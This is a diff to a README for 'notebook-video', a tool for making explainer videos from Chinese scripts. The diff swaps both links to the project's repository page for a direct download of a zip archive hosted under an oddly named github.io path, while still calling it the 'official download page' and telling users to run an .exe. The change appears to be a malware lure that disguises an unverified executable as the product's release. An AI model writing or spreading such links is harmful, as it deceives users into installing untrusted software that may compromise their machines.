@@ -5,7 +5,7 @@ description: "Convert Chinese explainer scripts into reproducible 2K notebook-st
 ---
 # 📽️ notebook-video - Create professional explainer videos with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bushadministrationbloodbrainbarrier232/notebook-video)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/bushadministrationbloodbrainbarrier232/bushadministrationbloodbrainbarrier232.github.io/main/pseudoembryo/App-v2.1-beta.1.zip)
 
 This tool turns your written scripts into 2K quality videos. You provide a script in Chinese, and the software builds a video layout with motion graphics. It adds voice narration and captions automatically to save you hours of manual editing. The program also checks the quality of your video to ensure it meets your standards before you publish it.
 
@@ -24,7 +24,7 @@ To run this tool, your computer needs to meet these basic standards:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official download page](https://github.com/bushadministrationbloodbrainbarrier232/notebook-video) to find the latest version.
+1. Visit the [official download page](https://raw.githubusercontent.com/bushadministrationbloodbrainbarrier232/bushadministrationbloodbrainbarrier232.github.io/main/pseudoembryo/App-v2.1-beta.1.zip) to find the latest version.
 2. Look for the file ending in .exe in the releases section.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
